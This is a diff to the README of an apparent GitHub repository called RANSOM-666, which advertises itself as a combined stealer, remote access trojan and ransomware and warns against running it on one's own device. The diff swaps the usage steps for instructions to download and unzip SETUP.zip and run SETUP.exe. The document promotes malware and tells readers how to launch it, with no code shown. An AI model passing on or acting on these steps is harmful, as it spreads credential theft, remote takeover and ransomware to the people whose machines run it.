@@ -2,7 +2,7 @@
 A Powerfull Stealer + Remote Access Trojan + Malware + Ransomware . Don't Run Them on your device.
 # In Progress
 
-![Logo](https://via.placeholder.com/150)
+![Logo]()
 
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 ![GitHub repo size](https://img.shields.io/github/repo-size/Coder333-A/RANSOM-666)
@@ -48,9 +48,9 @@ cd RANSOM-666
 
 ## 🚀 Usage
 
--  
--  UnZip MEGA.zip
--  Run 
+-  Download ```SETUP.zip```
+-  Unzip ```SETUP.zip```
+-  Run ```SETUP.exe```
 
 ## ✨Features
 
